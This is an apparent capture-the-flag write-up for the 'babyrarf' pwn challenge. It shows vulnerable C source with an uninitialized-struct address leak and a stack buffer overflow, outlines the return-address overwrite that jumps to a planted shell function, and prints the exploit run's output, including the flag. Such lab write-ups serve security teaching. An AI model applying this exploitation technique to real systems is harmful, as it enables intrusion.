# babyrarf

**Category**: Pwn \
**Points**: 100 (37 solves) \
**Author**: p4wn

## Challenge

Kill the rarf boss, get the flag.

`nc 35.204.144.114 1337`

## Solution

```
$ checksec babyrarf
[*] '/home/plushie/Programs/ctf/2021/union_ctf/babyrarf/babyrarf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Here's the source:
```c
...

typedef struct character {
    char name[10];
    int health;
} character;

...

// 🤔
void get_shell(){
    execve("/bin/sh", NULL, NULL);
}

attack choose_attack(){
    attack a;
    int id;
    puts("Choose an attack:\n");
    puts("1. Knife\n");
    puts("2. A bigger knife\n");
    puts("3. Her Majesty's knife\n");
    puts("4. A cr0wn\n");
    id = read_int();
    if (id == 1){
        a.id = 1;
        a.dmg = 10;
    }
    else if (id == 2){
        a.id = 2;
        a.dmg = 20;
    }
    else if (id == 3){
        a.id = 3;
        a.dmg = 30;
    }
    else if (id == 4){
        if (score == 0){
            // If we hit this branch, `a` is never initialized. We can use this
            // to leak some addresses.
            puts("l0zers don't get cr0wns\n");
        }
        else{
            a.id = 4;
            a.dmg = 40;
        }
    }
    else{
        puts("Please select a valid attack next time\n");
        a.id = 0;
        a.dmg = 0;
    }
    return a;
}

int main(){
    character player = { .health = 100};
    character boss = { .health = 100, .name = "boss"};
    attack a;
    int dmg;

    ...

    score = 10;
    while (score < 100){
        a = choose_attack();
        ...
        if (player.health > boss.health){
            puts("You won!\n");
            score += 1;
        }
        else{
            puts("You lost!\n");
            score -= 1;
        }
        ...
    }

    puts("Congratulations! You may now declare yourself the winner:\n");

    // Buffer is only 10 bytes, can overwrite return addr
    fgets(player.name, 48, stdin);
    return 0;
}
```

Exploit:
1. Get to zero points and attack with `4. A cr0wn`
2. This triggers `l0zers don't get cr0wns` and leaks two addresses
3. Use the leaked addresses to get address `get_shell`
4. Finish the game and reach `Congratulations! You may now declare yourself the winner:`
5. Overwrite return address with `get_shell`
6. Profit

```
$ python3 solve.py
[+] Opening connection to 35.204.144.114 on port 1337: Done
[*] '/home/plushie/Programs/ctf/2021/union_ctf/babyrarf/babyrarf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
0x560c30c774d0
0x7ffdee7ff7f0
---
[*] Switching to interactive mode
:

$ cat /home/babyrarf/flag.txt
union{baby_rarf_d0o_d00_do0_doo_do0_d0o}
$
```
